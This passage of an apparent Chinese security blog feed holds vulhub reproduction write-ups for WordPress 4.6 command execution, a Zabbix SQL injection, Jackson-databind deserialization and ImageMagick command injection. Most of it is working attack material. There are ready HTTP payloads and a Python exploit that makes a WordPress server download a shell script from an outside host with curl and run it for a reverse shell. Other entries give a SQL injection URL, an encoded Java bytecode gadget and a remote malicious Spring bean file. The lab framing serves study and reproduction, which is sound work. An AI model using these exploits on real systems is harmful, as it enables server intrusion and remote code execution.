img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wordpress 4.6 任意命令执行漏洞</title>
      <link href="/2019/03/01/wordpress-4.6-ren-yi-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/01/wordpress-4.6-ren-yi-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Wordpress-4-6-任意命令执行漏洞"><a href="#Wordpress-4-6-任意命令执行漏洞" class="headerlink" title="Wordpress 4.6 任意命令执行漏洞"></a>Wordpress 4.6 任意命令执行漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考 <a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="noopener">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>发送如下数据包，可见 <code>/tmp/success</code> 已经成功创建：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200316103707.png-water_print" alt=""></p><pre class=" language-http"><code class="language-http">POST /wp-login.php?action=lostpassword HTTP/1.1<span class="token header-name keyword">Host:</span> target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Content-Length:</span> 56<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencodedwp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin</code></pre><p>但实际利用起来，还是有一些坑需要踏过。具体的坑有这么几个：</p><ol><li>执行的命令不能包含大量特殊字符，如:、引号等。</li><li>命令会被转换成小写字母</li><li>命令需要使用绝对路径</li><li>需要知道某一个存在的用户的用户名</li></ol><p>为了解决这些坑，漏洞作者想出了，利用 <code>${substr{0}{1}{$spool_directory}}</code> 代替 <code>/</code>，用 <code>${substr{10}{1}{$tod_log}}</code> 代替空格的方法。</p><p>但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过 <code>curl -o /tmp/rce example.com/shell.sh</code> 的方法先将他下载到 <code>/tmp</code> 目录中，再去执行。</p><p>所以，总体来说利用过程如下：</p><ol><li>编写反弹 shell 的 exp，放到某个网页里。有如下要求：<ul><li>整个url的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径</li><li>访问该网页不能跳转，因为follow跳转的参数是-L（大写）</li></ul></li><li>拼接成命令 <code>/usr/bin/curl -o/tmp/rce example.com/shell.sh</code> 和命令 <code>/bin/bash /tmp/rce</code></li><li>将上述命令中的<code>空格</code>和 <code>/</code> 转换成 <code>${substr{10}{1}{$tod_log}}</code> 和 <code>${substr{0}{1}{$spool_directory}}</code></li><li>拼接成HTTP包的Host头：<code>target(any -froot@localhost -be ${run{command}} null)</code></li><li>依次发送这两个拼接好的数据包<br>上述过程写成exp脚本如下：</li></ol><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token comment" spellcheck="true"># wordpress's url</span>target <span class="token operator">=</span> <span class="token string">'http://127.0.0.1'</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token keyword">else</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># Put your command in a website, and use the website's url</span><span class="token comment" spellcheck="true"># don't contains "http://", must be all lowercase</span>shell_url <span class="token operator">=</span> <span class="token string">'example.com/1.txt'</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token keyword">else</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># an exists user</span>user <span class="token operator">=</span> <span class="token string">'root'</span><span class="token keyword">def</span> <span class="token function">generate_command</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>    command <span class="token operator">=</span> <span class="token string">'${run{%s}}'</span> <span class="token operator">%</span> command    command <span class="token operator">=</span> command<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'${substr{0}{1}{$spool_directory}}'</span><span class="token punctuation">)</span>    command <span class="token operator">=</span> command<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'${substr{10}{1}{$tod_log}}'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'target(any -froot@localhost -be %s null)'</span> <span class="token operator">%</span> commandsession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'user_login'</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span>    <span class="token string">'redirect_to'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token string">'wp-submit'</span><span class="token punctuation">:</span> <span class="token string">'Get New Password'</span><span class="token punctuation">}</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'Host'</span><span class="token punctuation">:</span> generate_command<span class="token punctuation">(</span><span class="token string">'/usr/bin/curl -o/tmp/rce '</span> <span class="token operator">+</span> shell_url<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'</span><span class="token punctuation">}</span>session<span class="token punctuation">.</span>allow_redirects <span class="token operator">=</span> <span class="token boolean">False</span>target <span class="token operator">+=</span> <span class="token string">'/wp-login.php?action=lostpassword'</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>session<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Host'</span><span class="token punctuation">]</span> <span class="token operator">=</span> generate_command<span class="token punctuation">(</span><span class="token string">'/bin/bash /tmp/rce'</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></code></pre><p>将脚本中 <code>target</code> 修改成你的目标，<code>user</code> 修改成一个已经存在的用户，<code>shell_url</code> 修改成你放置 <code>payload</code> 的网址。（或直接将target作为第一个参数、shell_url作为第二个参数）</p><p>执行即可获得shell：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200316105111.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zabbix latest.php SQL注入漏洞</title>
      <link href="/2019/03/01/zabbix-latest.php-sql-zhu-ru-lou-dong/"/>
      <url>/2019/03/01/zabbix-latest.php-sql-zhu-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）"><a href="#zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）" class="headerlink" title="zabbix latest.php SQL注入漏洞（CVE-2016-10134）"></a>zabbix latest.php SQL注入漏洞（CVE-2016-10134）</h1><p>zabbix是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问 <a href="http://your-ip:8080" target="_blank" rel="noopener">http://your-ip:8080</a>，用账号 <code>guest</code>（密码为空）登录游客账户。</p><p>登录后，查看 Cookie 中的 <code>zbx_sessionid</code>，复制后 <code>16</code> 位字符：</p><p>将这16个字符作为sid的值，访问 <a href="http://your-ip:8080/latest.php?output=ajax&amp;sid=055e1ffa36164a58&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)" target="_blank" rel="noopener">http://your-ip:8080/latest.php?output=ajax&amp;sid=055e1ffa36164a58&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)</a>，可见成功注入：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200316101325.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200316101745.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jackson-databind 反序列化漏洞（CVE-2017-7525）</title>
      <link href="/2019/02/21/jackson-databind-fan-xu-lie-hua-lou-dong-cve-2017-7525/"/>
      <url>/2019/02/21/jackson-databind-fan-xu-lie-hua-lou-dong-cve-2017-7525/</url>
      
        <content type="html"><![CDATA[<h1 id="Jackson-databind-反序列化漏洞（CVE-2017-7525）"><a href="#Jackson-databind-反序列化漏洞（CVE-2017-7525）" class="headerlink" title="Jackson-databind 反序列化漏洞（CVE-2017-7525）"></a>Jackson-databind 反序列化漏洞（CVE-2017-7525）</h1><p>Jackson-databind 支持 Polymorphic Deserialization 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 <code>TemplatesImpl</code>，可以实现任意代码执行。</p><p>所以，本漏洞利用条件如下：</p><ul><li><p>开启 JacksonPolymorphicDeserialization，即调用以下任意方法</p><pre><code>objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETEobjectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</code></pre></li><li><p>Target class 需要有无参 constructor</p></li><li><p>Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口</p></li></ul><h2 id="CVE-2017-7525"><a href="#CVE-2017-7525" class="headerlink" title="CVE-2017-7525"></a>CVE-2017-7525</h2><p><code>Jackson-databind</code>在设置<code>Target class</code>成员变量参数值时，若没有对应的 getter方法，则会使用<code>SetterlessProperty</code>调用<code>getter</code>方法，获取变量，然后设置变量值。当调用<code>getOutputProperties()</code>方法时，会初始化 <code>transletBytecodes</code>包含字节码的类，导致命令执行，具体可参考<code>java-deserialization-jdk7u21-gadget-note</code>中关于<code>TemplatesImpl</code>的说明。</p><p>使用<code>JDK7u21</code>的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>作为Gadget，发送如下请求，将会执行<code>touch /tmp/prove1.txt</code>：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /exploit HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 1298{  "param": [    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",    {      "transletBytecodes": [  "yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw=="      ],      "transletName": "a.b",      "outputProperties": {}    }  ]}</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727120016.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727120029.png-water_print" alt=""></p><p>这个POC只能运行在目标为JDK7u21以下的环境中，其他情况需要更换Gadget。</p><h2 id="CVE-2017-17485"><a href="#CVE-2017-17485" class="headerlink" title="CVE-2017-17485"></a>CVE-2017-17485</h2><p>CVE-2017-7525黑名单修复绕过，利用了<code>org.springframework.context.support.FileSystemXmlApplicationContext</code>，利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如<code>http://evil/spel.xml</code>，内容如下：</p><pre class=" language-XML"><code class="language-XML"><beans xmlns="http://www.springframework.org/schema/beans"       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"       xsi:schemaLocation="     http://www.springframework.org/schema/beans     http://www.springframework.org/schema/beans/spring-beans.xsd">    <bean id="pb" class="java.lang.ProcessBuilder">        <constructor-arg>            <array>                <value>touch</value>                <value>/tmp/prove2.txt</value>            </array>        </constructor-arg>        <property name="any" value="#{ pb.start() }"/>    </bean></beans></code></pre><p>然后，发送如下数据包，使Jackson加载bean，触发漏洞：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /exploit HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 138{  "param": [    "org.springframework.context.support.FileSystemXmlApplicationContext",    "http://IP/evil.xml"  ]}</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727120045.png-water_print" alt=""></p><p>成功执行<code>touch /tmp/prove2.txt</code>：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727120054.png-water_print" alt=""></p><p>原理： 利用<code>FileSystemXmlApplicationContext</code>加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用<code>start()</code>方法实现命令执行</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Jackson-databind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ImageMagick - CVE-2016-3714 命令执行</title>
      <link href="/2019/02/21/imagemagick-cve-2016-3714-ming-ling-zhi-xing/"/>
      <url>/2019/02/21/imagemagick-cve-2016-3714-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="ImageMagick-CVE-2016-3714-命令执行"><a href="#ImageMagick-CVE-2016-3714-命令执行" class="headerlink" title="ImageMagick - CVE-2016-3714 命令执行"></a>ImageMagick - CVE-2016-3714 命令执行</h1><p>ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。</p><p>国外的安全人员为此新建了一个网站： <a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a> ，不得不说，有些外国人蛮会玩的。</p><p>相对于之前的数个拥有『主页』的漏洞，这个洞确实不一般，确实是一个可以被利用的好洞，乌云主站上也爆出了数个被该漏洞影响的大厂商。我们先来分析一下它出现的原因。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p><p>ImageMagick有一个功能叫做delegate(委托)，作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的<a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347" target="_blank" rel="noopener">https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347</a></p><p>我们在ImageMagick的默认配置文件里可以看到所有的委托： /etc/ImageMagick/delegates.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype">&lt;!DOCTYPE delegatemap [&lt;!ELEMENT delegatemap (delegate)+></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">delegate</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ATTLIST</span> <span class="token attr-name">delegate</span> <span class="token attr-name">decode</span> <span class="token attr-name">CDATA</span> <span class="token attr-name">#IMPLIED</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ATTLIST</span> <span class="token attr-name">delegate</span> <span class="token attr-name">encode</span> <span class="token attr-name">CDATA</span> <span class="token attr-name">#IMPLIED</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ATTLIST</span> <span class="token attr-name">delegate</span> <span class="token attr-name">mode</span> <span class="token attr-name">CDATA</span> <span class="token attr-name">#IMPLIED</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ATTLIST</span> <span class="token attr-name">delegate</span> <span class="token attr-name">spawn</span> <span class="token attr-name">CDATA</span> <span class="token attr-name">#IMPLIED</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ATTLIST</span> <span class="token attr-name">delegate</span> <span class="token attr-name">stealth</span> <span class="token attr-name">CDATA</span> <span class="token attr-name">#IMPLIED</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ATTLIST</span> <span class="token attr-name">delegate</span> <span class="token attr-name">thread-support</span> <span class="token attr-name">CDATA</span> <span class="token attr-name">#IMPLIED</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ATTLIST</span> <span class="token attr-name">delegate</span> <span class="token attr-name">command</span> <span class="token attr-name">CDATA</span> <span class="token attr-name">#REQUIRED</span><span class="token punctuation">></span></span>]><span class="token comment" spellcheck="true">&lt;!--Delegate command file.Commands which specifydecode="in_format" encode="out_format"specify the rules for converting from in_format to out_format Theserules may be used to translate directly between formats.Commands which specify onlydecode="in_format"specify the rules for converting from in_format to some format thatImageMagick will automatically recognize. These rules are used todecode formats.Commands which specify onlyencode="out_format"specify the rules for an "encoder" which may accept any input format.For delegates other than ps:*, pcl:*, and mpeg:* the substitution rules areas follows:%i  input image filename%o  output image filename%u  unique temporary filename%Z  unique temporary filename%#  input image signature%b  image file size%c  input image comment%g  image geometry%h  image rows (height)%k  input image number colors%l  image label%m  input image format%p  page number%q  input image depth%s  scene number%w  image columns (width)%x  input image x resolution%y  input image y resolutionSet option delegate:bimodal=true to process bimodal delegates otherwise theyare ignored.If stealth="True" the delegate is not listed in user requested"-list delegate" listings. These are typically special internal delegates.If spawn="True" ImageMagick will not way for the delegate to finish,nor will it read any output image.  It will only wait for either the inputfile to be removed (See "ephemeral:" coder) indicating that the input filehas been read, or a maximum time limit of 2 seconds.--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegatemap</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>autotrace<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;convert&amp;quot; &amp;quot;%i&amp;quot; &amp;quot;pnm:%u&amp;quot;\n&amp;quot;autotrace&amp;quot; -input-format pnm -output-format svg -output-file &amp;quot;%o&amp;quot; &amp;quot;%u&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>blender<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;blender&amp;quot; -b &amp;quot;%i&amp;quot; -F PNG -o &amp;quot;%o&amp;quot;&amp;quot;\n&amp;quot;convert&amp;quot; -concatenate &amp;quot;%o*.png&amp;quot; &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>browse<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">spawn</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;xdg-open&amp;quot; http://www.imagemagick.org/; rm &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cdr<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;uniconvertor&amp;quot; &amp;quot;%i&amp;quot; &amp;quot;%o.svg&amp;quot;; mv &amp;quot;%o.svg&amp;quot; &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cgm<span class="token punctuation">"</span></span> <span class="token attr-name">thread-support</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>False<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;ralcgm&amp;quot; -d ps -oC &amp;lt; &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dvi<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;dvips&amp;quot; -q -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dng:decode<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;ufraw-batch&amp;quot; --silent --create-id<span class="token punctuation">=</span>also --out-type<span class="token punctuation">=</span>png --out-depth<span class="token punctuation">=</span>16 &amp;quot;--output<span class="token punctuation">=</span>%u.png&amp;quot; &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dot<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>&amp;quot;dot&amp;quot; -Tsvg &amp;quot;%i&amp;quot; -o &amp;quot;%o&amp;quot;<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>edit<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;/etc/alternatives/x-terminal-emulator&amp;quot; -title &amp;quot;Edit Image Comment&amp;quot; -e vi &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eps<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pdf<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 &amp;quot;-sDEVICE<span class="token punctuation">=</span>pdfwrite&amp;quot; &amp;quot;-sOutputFile<span class="token punctuation">=</span>%o&amp;quot; &amp;quot;-f%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token 